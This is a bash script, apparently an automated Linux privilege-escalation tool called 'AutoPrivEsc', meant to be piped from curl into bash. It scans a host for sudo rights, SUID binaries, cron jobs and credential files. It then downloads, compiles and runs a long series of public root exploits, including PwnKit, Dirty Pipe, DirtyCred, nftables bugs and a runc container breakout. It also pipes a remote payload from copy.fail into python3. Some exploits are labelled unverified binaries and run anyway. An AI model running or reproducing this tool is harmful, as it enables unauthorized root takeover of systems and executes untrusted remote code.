#!/bin/bash
# ============================================
# Thiscitze AutoPrivEsc - Scan -> Match -> Exploit
# Kullanim: curl -fsSL <RAW_URL> | bash [flags]
# ============================================

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

# ===== ARGS =====
QUIET=0
CLEANUP=0
NO_COPYFAIL=0
DO_SCAN=0
DO_SCAN_ONLY=0
WORKDIR=""
for A in "$@"; do
    case "$A" in
        -q|--quiet) QUIET=1 ;;
        --cleanup) CLEANUP=1 ;;
        --no-copyfail) NO_COPYFAIL=1 ;;
        --scan) DO_SCAN=1 ;;
        --scan-only) DO_SCAN=1; DO_SCAN_ONLY=1 ;;
        --workdir) shift; WORKDIR="$1" ;;
        -h|--help)
            echo "Usage: $0 [flags]"
            echo "  --scan            run read-only enumeration, then all exploits"
            echo "  --scan-only       run enumeration only (no exploits, no traces)"
            echo "  -q --quiet        compact output"
            echo "  --cleanup         remove workdir when done"
            echo "  --no-copyfail     skip the copy.fail payload"
            echo "  --workdir /path   force a specific writable+executable dir"
            exit 0 ;;
    esac
done

# ===== TOOLS =====
NEED="curl python3"
for T in $NEED; do
    command -v $T >/dev/null 2>&1 || { echo -e "${RED}[-] missing: $T${NC}"; exit 1; }
done
command -v gcc >/dev/null 2>&1 && HAS_GCC=1 || HAS_GCC=0
command -v make >/dev/null 2>&1 && HAS_MAKE=1 || HAS_MAKE=0
command -v git >/dev/null 2>&1 && HAS_GIT=1 || HAS_GIT=0
command -v unzip >/dev/null 2>&1 && HAS_UNZIP=1 || HAS_UNZIP=0
command -v timeout >/dev/null 2>&1 && HAS_TIMEOUT=1 || HAS_TIMEOUT=0
if [ "$HAS_GCC" = "0" ]; then
    echo -e "${YELLOW}[-] gcc not found - skipping compile-based exploits${NC}"
fi

# ===== BANNER =====
echo -e "${RED}"
echo "  ████████╗██╗  ██╗██╗███████╗ ██████╗██╗████████╗███████╗"
echo "  ╚══██╔══╝██║  ██║██║██╔════╝██╔════╝██║╚══██╔══╝██╔════╝"
echo "     ██║   ███████║██║███████╗██║     ██║   ██║   █████╗  "
echo "     ██║   ██╔══██║██║╚════██║██║     ██║   ██║   ██╔══╝  "
echo "     ██║   ██║  ██║██║███████║╚██████╗██║   ██║   ███████╗"
echo "     ╚═╝   ╚═╝  ╚═╝╚═╝╚══════╝ ╚═════╝╚═╝   ╚═╝   ╚══════╝"
echo -e "${NC}"
echo -e "${GREEN}   AutoPrivEsc  -  Scan -> Match -> Exploit${NC}"
echo -e "${YELLOW}   -------------------------------------------------${NC}"
echo -e "${YELLOW}[*] Scanning system...${NC}"
echo ""

# ===== SYSTEM SCAN =====
KERNEL=$(uname -r)
OS=$(cat /etc/os-release 2>/dev/null | grep "^ID=" | cut -d= -f2 | tr -d '"')
OS_VER=$(cat /etc/os-release 2>/dev/null | grep "VERSION_ID" | cut -d= -f2 | tr -d '"')
ARCH=$(uname -m)
CPU=$(grep "model name" /proc/cpuinfo | head -1 | cut -d: -f2)
HOSTNAME=$(hostname)
KERNEL_MAJ=$(echo $KERNEL | cut -d. -f1)
KERNEL_MIN=$(echo $KERNEL | cut -d. -f2)
GLIBC=$(ldd --version 2>/dev/null | head -1 | grep -oE '[0-9]+\.[0-9]+' | head -1)
[ -z "$GLIBC" ] && GLIBC="unknown"

echo -e "${CYAN}[SYSTEM]${NC}"
echo "  Kernel : $KERNEL"
echo "  OS     : $OS $OS_VER"
echo "  Arch   : $ARCH"
echo "  CPU    :$CPU"
echo "  Host   : $HOSTNAME"
echo "  GLibc  : $GLIBC"
echo ""

# ===== ROOT CHECK =====
if [ "$(id -u)" = "0" ]; then
    echo -e "${GREEN}[+] Already root. Nothing to do.${NC}"
    exit 0
fi

# ===== NETWORK CHECK =====
NET_OK=1
if [ "$HAS_TIMEOUT" = "1" ]; then
    timeout 8 curl -fsSI https://github.com -o /dev/null 2>/dev/null || NET_OK=0
else
    NET_OK=1
fi
if [ "$NET_OK" = "0" ]; then
    echo -e "${YELLOW}[-] no outbound network - downloads will fail, local checks only${NC}"
fi

# ===== HELPERS =====
is_exec_dir() {
    local d="$1"
    mkdir -p "$d" 2>/dev/null || return 1
    [ -w "$d" ] || return 1
    local t="$d/.x_$$"
    printf '#!/bin/sh\nexit 0\n' > "$t" 2>/dev/null || return 1
    chmod +x "$t" 2>/dev/null
    "$t" 2>/dev/null && { rm -f "$t"; return 0; }
    rm -f "$t"
    return 1
}

find_workdir() {
    local d
    for d in "$PWD" "${TMPDIR:-}" "$HOME/.cache/apex" "/var/tmp/apex" "/dev/shm/apex" "/tmp/apex"; do
        [ -n "$d" ] || continue
        if is_exec_dir "$d"; then echo "$d"; return 0; fi
        if [ -d "$d" ] || mkdir -p "$d" 2>/dev/null; then
            [ -w "$d" ] || warn "workdir $d: not writable"
            local t="$d/.x_$$"
            printf '#!/bin/sh\nexit 0\n' > "$t" 2>/dev/null && chmod +x "$t" 2>/dev/null
            "$t" 2>/dev/null || warn "workdir $d: noexec"
            rm -f "$t" 2>/dev/null
        else
            warn "workdir $d: not creatable"
        fi
    done
    return 1
}

if [ -n "$WORKDIR" ]; then
    WRK="$WORKDIR"
else
    WRK=$(find_workdir) || { echo -e "${RED}[-] no writable+executable dir found${NC}"; echo -e "${YELLOW}[-] hint: run with --workdir \$PWD${NC}"; exit 1; }
fi
LOGFILE=$WRK/exploit.log
SUM=$WRK/summary.txt
mkdir -p "$WRK" 2>/dev/null || { echo -e "${RED}[-] cannot create workdir $WRK${NC}"; exit 1; }
: > "$LOGFILE"
: > "$SUM"
cd "$WRK" 2>/dev/null || { echo -e "${RED}[-] cannot cd to $WRK${NC}"; exit 1; }
echo -e "${CYAN}[WORKDIR] $WRK${NC}"
echo ""

kcfg() {
    grep -qs "^$1=[ym]" /boot/config-$(uname -r) 2>/dev/null && return 0
    zcat /proc/config.gz 2>/dev/null | grep -qs "^$1=[ym]" && return 0
    return 1
}

fetch_repo() {
    local repo="$1" dir="$2"
    rm -rf "$dir" "$dir.tgz"
    if [ "$HAS_GIT" = "1" ]; then
        if GIT_TERMINAL_PROMPT=0 git clone -q --depth 1 "https://github.com/$repo.git" "$dir" 2>/dev/null; then
            return 0
        fi
    fi
    local br
    for br in main master; do
        if curl -fsSL "https://codeload.github.com/$repo/tar.gz/refs/heads/$br" -o "$dir.tgz" 2>/dev/null; then
            mkdir -p "$dir" && tar xzf "$dir.tgz" -C "$dir" --strip-components=1 2>/dev/null && rm -f "$dir.tgz"
            return 0
        fi
    done
    return 1
}

# zip extraction must be inline (run() executes in a fresh bash without our functions/vars)

# --- kernel version compare ---
knum() { echo "$1" | awk -F. '{printf "%d%02d", $1, $2}'; }
KCUR=$(knum "$KERNEL")
in_krange() { # "5.8-5.16" or "*"
    local r="$1"
    [ "$r" = "*" ] && return 0
    local lo="${r%%-*}" hi="${r##*-}"
    local nlo=$(knum "$lo") nhi=$(knum "$hi")
    [ "$KCUR" -ge "$nlo" ] && [ "$KCUR" -le "$nhi" ]
}
glibc_ge() { # compare against GLIBC var
    local need=$(echo "$1" | awk -F. '{printf "%d%02d", $1, $2}')
    local have=$(echo "$GLIBC" | awk -F. '{printf "%d%02d", $1, $2}')
    [ "$have" -ge "$need" ]
}

warn() { echo -e "${YELLOW}[!] $*${NC}"; }
note() { echo -e "${GREEN}[+] $*${NC}"; }

got_root() {
    local who="$1"
    echo -e "${RED}"
    echo "  ██████╗  ██████╗  ██████╗ ████████╗     ██████╗  ██████╗ ████████╗ ██████╗ "
    echo "  ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝    ██╔═══██╗██╔═══██╗╚══██╔══╝██╔═══██╗"
    echo "  ██████╔╝██║   ██║██║   ██║   ██║       ██║   ██║██║   ██║   ██║   ██║   ██║"
    echo "  ██╔══██╗██║   ██║██║   ██║   ██║       ██║   ██║██║   ██║   ██║   ██║   ██║"
    echo "  ██║  ██║╚██████╔╝╚██████╔╝   ██║       ╚██████╔╝╚██████╔╝   ██║   ╚██████╔╝"
    echo "  ╚═╝  ╚═╝ ╚═════╝  ╚═════╝    ╚═╝        ╚═════╝  ╚═════╝    ╚═╝    ╚═════╝ "
    echo -e "${NC}"
    echo -e "${GREEN}[+] UID: $(id -u)  EUID: $(id -u)  via: $who${NC}"
    id
    echo ""
    if [ "$(id -u)" != "0" ]; then
        echo -e "${YELLOW}[!] script's own uid is not 0, but exploit output reported root.${NC}"
        echo -e "${YELLOW}[!] verify with: su -c id   |   id   |   ps -u root${NC}"
    fi
    echo -e "${GREEN}[+] ROOT! Stopping. Clean up: rm -rf $WRK${NC}"
    [ "$CLEANUP" = "1" ] && rm -rf "$WRK"
    exit 0
}

out_shows_root() {
    grep -qiE "uid=0\(|euid=0\(|uid=0\b|euid=0\b|root@|^#\s*$" "$1" 2>/dev/null
}

run() {
    local cmd="$1" name="${2:-$1}"
    echo -e "${CYAN}[>] Trying: $name${NC}"
    echo "==== $name :: $cmd ====" >> $LOGFILE
    local OUT=$WRK/.out.$$
    local RCMD="$cmd; id 2>&1"
    local TIMEOUT_KILLED=0
    if [ "$HAS_TIMEOUT" = "1" ] && command -v setsid >/dev/null 2>&1; then
        setsid bash -c "$RCMD" </dev/null >"$OUT" 2>&1 &
        local PID=$!
        local S=0
        while kill -0 $PID 2>/dev/null && [ $S -lt 90 ]; do
            sleep 1; S=$((S+1))
        done
        if kill -0 $PID 2>/dev/null; then
            if out_shows_root "$OUT"; then
                [ "$QUIET" = "0" ] && echo -e "${YELLOW}    [root shell detected] not killing process group...${NC}"
                sleep 1
                wait $PID 2>/dev/null
                RC=$?
            else
                [ "$QUIET" = "0" ] && echo -e "${YELLOW}    [timeout] killing process group...${NC}"
                kill -- -$PID 2>/dev/null
                sleep 2
                kill -9 -- -$PID 2>/dev/null
                RC=124
                TIMEOUT_KILLED=1
            fi
        else
            wait $PID 2>/dev/null
            RC=$?
        fi
    elif [ "$HAS_TIMEOUT" = "1" ]; then
        timeout -k 5 90 bash -c "$RCMD" </dev/null >"$OUT" 2>&1
        RC=$?
    else
        bash -c "$RCMD" </dev/null >"$OUT" 2>&1
        RC=$?
    fi
    if [ "$QUIET" = "0" ]; then
        sed 's/^/    /' "$OUT" | tee -a $LOGFILE
    else
        cat "$OUT" >> $LOGFILE
    fi
    if [ "$(id -u)" = "0" ]; then
        rm -f "$OUT"
        echo "$name|OK|root" >> $SUM
        echo -e "${GREEN}[+] SUCCESS via: $name${NC}"
        got_root "$name"
    elif out_shows_root "$OUT"; then
        rm -f "$OUT"
        echo "$name|OK?|root-in-output" >> $SUM
        echo -e "${GREEN}[+] ROOT via: $name (root reported in output)${NC}"
        got_root "$name"
    else
        rm -f "$OUT"
        echo "$name|FAIL|exit=$RC" >> $SUM
        echo -e "${YELLOW}[-] no root (exit code: $RC)${NC}"
        echo ""
    fi
}

# ===== ENUMERATION (read-only) =====
enum_scan() {
    echo -e "${CYAN}===== ENUMERATION =====${NC}"
    echo ""
    echo -e "${CYAN}[USERS/GROUPS]${NC}"
    id
    echo ""
    echo -e "${CYAN}[SUDO]${NC}"
    if sudo -n -l 2>/dev/null | grep -qE "NOPASSWD|\(ALL"; then
        note "sudo available without password:"
        sudo -n -l 2>/dev/null
    else
        warn "no NOPASSWD sudo (or password required)"
    fi
    echo ""
    echo -e "${CYAN}[SUID]${NC}"
    find / -perm -4000 -type f 2>/dev/null | while read -r f; do echo "  $f"; done
    echo ""
    echo -e "${CYAN}[CAPABILITIES]${NC}"
    getcap -r / 2>/dev/null | grep -v '^/dev' | while read -r l; do echo "  $l"; done
    echo ""
    echo -e "${CYAN}[WRITABLE PATH]${NC}"
    IFS=: read -ra PATHS <<< "$PATH"
    for d in "${PATHS[@]}"; do
        [ -d "$d" ] && [ -w "$d" ] && echo "  $d"
    done
    echo ""
    echo -e "${CYAN}[CRON]${NC}"
    ls -la /etc/cron.d /etc/cron.daily 2>/dev/null | while read -r l; do echo "  $l"; done
    grep -rE "^\S+\s+\S+\s+\S+\s+\S+\s+\S+\s+\S+" /etc/crontab 2>/dev/null | while read -r l; do echo "  $l"; done
    echo ""
    echo -e "${CYAN}[PASSWD]${NC}"
    [ -w /etc/passwd ] && note "/etc/passwd is writable!" || warn "/etc/passwd not writable"
    echo ""
    echo -e "${CYAN}[CREDENTIALS]${NC}"
    grep -rliE "password|secret|api[_-]?key" /home/*/.* 2>/dev/null | head -10 | while read -r f; do echo "  $f"; done
    ls -la /home/*/.ssh 2>/dev/null | while read -r l; do echo "  $l"; done
    echo ""
    echo -e "${CYAN}[CONTAINER]${NC}"
    if [ -f /.dockerenv ] || grep -qE "docker|kubepods|lxc" /proc/1/cgroup 2>/dev/null; then
        note "running inside a container"
    else
        warn "not a container"
    fi
    echo ""
    echo -e "${CYAN}[KERNEL MATCH]${NC}"
    for r in "5.8-5.16" "5.14-6.99" "6.1-6.6" "5.19-6.8" "5.10-5.17"; do
        in_krange "$r" && echo "  kernel in range $r"
    done
    echo ""
}

if [ "$DO_SCAN" = "1" ]; then
    enum_scan
    if [ "$DO_SCAN_ONLY" = "1" ]; then
        echo -e "${GREEN}[+] enumeration done (no exploits run)${NC}"
        [ "$CLEANUP" = "1" ] && rm -rf "$WRK"
        exit 0
    fi
fi

# ===== INLINE QUICK RECON (default runs) =====
if [ "$DO_SCAN" = "0" ]; then
    echo -e "${CYAN}[QUICK RECON]${NC}"
    if command -v sudo >/dev/null 2>&1 && sudo -n -l 2>/dev/null | grep -qE "NOPASSWD|\(ALL"; then
        note "sudo available without password"
    else
        warn "no NOPASSWD sudo"
    fi
    [ -w /etc/passwd ] && note "/etc/passwd is writable!" || warn "/etc/passwd not writable"
    if [ -f /.dockerenv ] || grep -qE "docker|kubepods|lxc" /proc/1/cgroup 2>/dev/null; then
        note "running inside a container"
    fi
    echo ""
fi

# ===== TARGETS =====
echo -e "${CYAN}[CHECKING EXPLOIT TARGETS]${NC}"
echo ""

# --- PwnKit (CVE-2021-4034) ---
if [ "$HAS_GCC" = "1" ] && ( [ -x "$(command -v pkexec 2>/dev/null)" ] || [ -f "/usr/bin/pkexec" ] ); then
    note "pkexec found -> CVE-2021-4034 (PwnKit)"
    run "curl -fsSL https://raw.githubusercontent.com/arthepsy/CVE-2021-4034/refs/heads/main/cve-2021-4034-poc.c -o pwn.c && gcc pwn.c -o pwn && ./pwn" "PwnKit"
else
    [ "$HAS_GCC" = "0" ] && warn "skip PwnKit (no gcc)"
fi

# --- PwnKit alt (Rvn0xsy) ---
if [ "$HAS_GCC" = "1" ] && ( [ -x "$(command -v pkexec 2>/dev/null)" ] || [ -f "/usr/bin/pkexec" ] ); then
    note "pkexec found -> CVE-2021-4034 (alt POC)"
    fetch_repo Rvn0xsy/CVE-2021-4034 rvn && run "cd rvn && gcc cve-2021-4034.c -o exp && ./exp" "PwnKit-alt" || warn "failed to fetch Rvn0xsy/CVE-2021-4034"
fi

# --- Dirty Pipe (CVE-2022-0847) ---
in_krange "5.8-5.16" || warn "Dirty Pipe: kernel out of range (5.8-5.16), trying anyway"
if [ "$HAS_GCC" = "1" ]; then
    fetch_repo Arinerron/CVE-2022-0847-DirtyPipe-Exploit dp && run "cd dp && gcc exploit.c -o exploit && ./exploit" "Dirty Pipe" || warn "failed to fetch Arinerron/CVE-2022-0847-DirtyPipe-Exploit"
fi

# --- GameOver(lay) (CVE-2023-2640 + CVE-2023-32629) ---
if [ "$OS" = "ubuntu" ] && ( lsmod 2>/dev/null | grep -q overlay || [ -d "/sys/module/overlay" ] ); then
    note "Ubuntu + OverlayFS -> CVE-2023-2640 + CVE-2023-32629"
    run "curl -fsSL https://raw.githubusercontent.com/g1vi/CVE-2023-2640-CVE-2023-32629/main/exploit.sh -o gameover.sh && chmod +x gameover.sh && bash gameover.sh" "GameOverlay"
fi

# --- DirtyCred ---
in_krange "5.14-6.99" || warn "DirtyCred: kernel out of range (5.14-6.x), trying anyway"
if [ "$HAS_GCC" = "1" ]; then
    fetch_repo PR0fix/DirtyCred dc && run "cd dc && make && ./exploit" "DirtyCred" || warn "failed to fetch PR0fix/DirtyCred"
fi

# --- DirtyFrag ---
in_krange "6.1-6.6" || warn "DirtyFrag: kernel out of range (6.1-6.6), trying anyway"
if [ "$HAS_GCC" = "1" ]; then
    fetch_repo V4bel/dirtyfrag df && run "cd df && gcc -O0 -Wall -o exp exp.c -lutil && ./exp" "DirtyFrag" || warn "failed to fetch V4bel/dirtyfrag"
fi

# --- FragNesia ---
in_krange "5.19-6.8" || warn "FragNesia: kernel out of range (5.19-6.8), trying anyway"
if [ "$HAS_GCC" = "1" ]; then
    fetch_repo v12-security/pocs pocs && run "cd pocs/fragnesia && gcc -o exp fragnesia.c && ./exp" "FragNesia" || warn "failed to fetch v12-security/pocs"
fi

# --- eBPF Ring Buffer / Verifier LPE ---
if [ "$HAS_GCC" = "1" ] && kcfg CONFIG_BPF_SYSCALL && kcfg CONFIG_BPF && kcfg CONFIG_USER_NS; then
    note "eBPF enabled -> eBPF LPE"
    fetch_repo argonsecurity/ebpf-lpe-poc ebpf && run "cd ebpf && make && ./exploit" "eBPF-LPE" || warn "failed to fetch argonsecurity/ebpf-lpe-poc"
else
    [ "$HAS_GCC" = "0" ] && warn "skip eBPF (no gcc)" || warn "skip eBPF (BPF/user-ns disabled)"
fi

# --- Netfilter / nf_tables (CVE-2023-32233) ---
if [ "$HAS_GCC" = "1" ] && kcfg CONFIG_NF_TABLES; then
    note "nftables enabled -> CVE-2023-32233"
    fetch_repo bluefrostsecurity/CVE-2023-32233-PoC nft && run "cd nft && gcc -O2 exploit.c -o exploit -lnftables && ./exploit" "nftables-32233" || warn "failed to fetch bluefrostsecurity/CVE-2023-32233-PoC"
else
    [ "$HAS_GCC" = "0" ] && warn "skip nftables (no gcc)" || warn "skip nftables (CONFIG_NF_TABLES disabled)"
fi

# --- SLUB Overflow (CVE-2022-29582) ---
in_krange "5.10-5.17" || warn "SLUB: kernel out of range (5.10-5.17), trying anyway"
if [ "$HAS_GCC" = "1" ]; then
    fetch_repo Bonfee/CVE-2022-29582 slub && run "cd slub && gcc -O2 exploit.c -o exploit && ./exploit" "SLUB-29582" || warn "failed to fetch Bonfee/CVE-2022-29582"
fi

# --- io_uring UAF ---
if [ "$HAS_GCC" = "1" ] && kcfg CONFIG_IO_URING; then
    note "io_uring enabled -> io_uring LPE"
    fetch_repo kxcode/iouring-exploit-poc iou && run "cd iou && gcc -O2 exploit.c -o exploit -lpthread && ./exploit" "io_uring" || warn "failed to fetch kxcode/iouring-exploit-poc"
else
    [ "$HAS_GCC" = "0" ] && warn "skip io_uring (no gcc)" || warn "skip io_uring (CONFIG_IO_URING disabled)"
fi

# --- TONTOU (Spectre v2 bypass, AMD Zen 2) ---
if echo "$CPU" | grep -qi "AMD.*Zen.2\|AMD.*Ryzen.*3[0-9]\|AMD.*EPYC.*7[0-9]"; then
    note "AMD Zen 2 -> TONTOU"
    run "curl -fsSL https://github.com/CSAIL-Arch-Sec/tontou/archive/refs/heads/main.zip -o tontou.zip && mkdir -p .x && python3 -c 'import zipfile,sys; zipfile.ZipFile(sys.argv[1]).extractall(sys.argv[2])' tontou.zip .x && cd .x/tontou-main && make && ./tontou" "TONTOU"
else
    warn "skip TONTOU (not AMD Zen 2)"
fi

# --- CVE-2026-46215 ---
[ "$KERNEL_MAJ" -ge 7 ] 2>/dev/null || warn "CVE-2026-46215: needs kernel >= 7, trying anyway"
if [ "$HAS_GCC" = "1" ]; then
    fetch_repo bluedragonsecurity/CVE-2026-46215-exploit-linux-7.0-uaf-stable c46215 && run "cd c46215 && gcc -o exploit exploit.c -lpthread -lutil -static && ./exploit" "CVE-2026-46215" || warn "failed to fetch bluedragonsecurity/CVE-2026-46215-exploit-linux-7.0-uaf-stable"
fi

# --- PackageKit (CVE-2026-41651) ---
if dpkg -l 2>/dev/null | grep -qi packagekit || rpm -qa 2>/dev/null | grep -qi PackageKit; then
    note "PackageKit installed -> CVE-2026-41651"
    glibc_ge 2.33 || warn "41651: glibc $GLIBC < 2.33 (binary needs GLIBC_2.33+), trying anyway"
    fetch_repo Vozec/CVE-2026-41651 pk && run "cd pk && chmod +x cve-2026-41651 && ./cve-2026-41651" "CVE-2026-41651" || warn "failed to fetch Vozec/CVE-2026-41651"
fi

# --- Polkit / DBus (CVE-2021-3560) ---
if [ -f "/usr/bin/pkexec" ] || [ -f "/usr/bin/polkit-agent-helper-1" ]; then
    note "Polkit present -> CVE-2021-3560"
    fetch_repo cybersecurityworks/CVE-2021-3560-Exploit-POC p3560 && run "cd p3560 && python3 cve-2021-3560.py" "CVE-2021-3560" || warn "failed to fetch cybersecurityworks/CVE-2021-3560-Exploit-POC"
fi

# --- runc Container Breakout (CVE-2024-21626) ---
if [ -f /.dockerenv ] || grep -qE "docker|kubepods|lxc" /proc/1/cgroup 2>/dev/null; then
    note "container detected -> runc breakout (CVE-2024-21626)"
    fetch_repo snyk/CVE-2024-21626-PoC runc && run "cd runc && bash exploit.sh" "runc-21626" || warn "failed to fetch snyk/CVE-2024-21626-PoC"
else
    warn "skip runc breakout (not a container)"
fi

# --- OVSwrap ---
if lsmod 2>/dev/null | grep -q openvswitch || [ -d "/sys/module/openvswitch" ]; then
    note "Open vSwitch loaded -> OVSwrap"
    fetch_repo manizada/OVSwrap ovs && run "cd ovs && echo y | python3 ovswrap-poc.py" "OVSwrap" || warn "failed to fetch manizada/OVSwrap"
fi

# --- CVE-2026-31431 ---
if [ "$HAS_UNZIP" = "1" ] || python3 -c "import zipfile" 2>/dev/null; then
    warn "CVE-2026-31431: unverified repo, trying anyway"
    run "curl -fsSL https://github.com/JuanBindez/CVE-2026-31431/archive/refs/heads/main.zip -o c31431.zip && mkdir -p .x && python3 -c 'import zipfile,sys; zipfile.ZipFile(sys.argv[1]).extractall(sys.argv[2])' c31431.zip .x && cd .x/CVE-2026-31431-main && python3 main.py" "CVE-2026-31431"
fi

# --- CVE-2026-46300 (hazir binary) ---
warn "CVE-2026-46300: unverified binary, trying anyway"
fetch_repo ExploitEoom/CVE-2026-46300 c46300 && run "cd c46300 && chmod +x exploit && ./exploit" "CVE-2026-46300" || warn "failed to fetch ExploitEoom/CVE-2026-46300"

# --- CVE-2026-64600 ---
if [ "$HAS_GCC" = "1" ]; then
    warn "CVE-2026-64600: unverified repo, trying anyway"
    fetch_repo Debajyoti0-0/CVE-2026-64600 c64600 && run "cd c64600 && gcc -o cve-2026-64600 cve-2026-64600.c -lm -lpthread && ./cve-2026-64600" "CVE-2026-64600" || warn "failed to fetch Debajyoti0-0/CVE-2026-64600"
fi

# --- CVE-2026-68138 ---
if [ "$HAS_GCC" = "1" ]; then
    warn "CVE-2026-68138: unverified repo, trying anyway"
    fetch_repo aramosf/CVE-2026-68138 c68138 && run "cd c68138 && bash build.sh && ./build/exploit" "CVE-2026-68138" || warn "failed to fetch aramosf/CVE-2026-68138"
fi

# --- CVE-2026-68398 (gcc) ---
if [ "$HAS_GCC" = "1" ]; then
    warn "CVE-2026-68398: expects 5.15.0-187-generic, current $KERNEL - trying anyway"
    fetch_repo aramosf/cve-2026-68398 c68398 && run "cd c68398 && gcc -O2 exploit.c kaslr_prefetch.c -o exploit -lpthread && ./exploit" "CVE-2026-68398" || warn "failed to fetch aramosf/cve-2026-68398"
fi

# --- CVE-2026-68398 (make) ---
if [ "$HAS_MAKE" = "1" ]; then
    warn "CVE-2026-68398-make: expects 5.15.0-187-generic, current $KERNEL - trying anyway"
    fetch_repo aramosf/cve-2026-68398 c68398b && run "cd c68398b && make && ./build/CVE-2026-68398" "CVE-2026-68398-make" || warn "failed to fetch aramosf/cve-2026-68398"
fi

# --- copy.fail exp ---
if [ "$NO_COPYFAIL" = "0" ]; then
    warn "copy.fail: runs code from third-party URL (risky), trying anyway"
    run "curl https://copy.fail/exp | python3 && su" "copy.fail"
fi

# ===== RESULT =====
echo "================================================"
if [ "$(id -u)" = "0" ]; then
    echo -e "${GREEN}[+] ROOT GOT!${NC}"
    id
else
    echo -e "${RED}[-] All exploits failed. No root obtained.${NC}"
fi
echo ""
echo -e "${CYAN}[SUMMARY]${NC}"
if [ -s "$SUM" ]; then
    while IFS='|' read -r n rs rr; do
        case "$rs" in
            OK)   echo -e "  ${GREEN}[OK]${NC}   $n";;
            OK?)  echo -e "  ${GREEN}[OK?]${NC}  $n (root in output — verify: su -c id)";;
            FAIL) echo -e "  ${RED}[FAIL]${NC} $n ($rr)";;
        esac
    done < "$SUM"
else
    echo "  (nothing was attempted)"
fi
echo ""
echo -e "${YELLOW}[-] Full log: $LOGFILE${NC}"
echo -e "${YELLOW}[-] Common causes: hardened kernel (grsec), missing SUID, noexec workdir, patched kernel, fake repos, unverified binaries${NC}"
echo -e "${YELLOW}[-] Clean up: rm -rf $WRK${NC}"
if [ "$CLEANUP" = "1" ]; then
    rm -rf "$WRK"
    echo -e "${GREEN}[+] workdir removed${NC}"
fi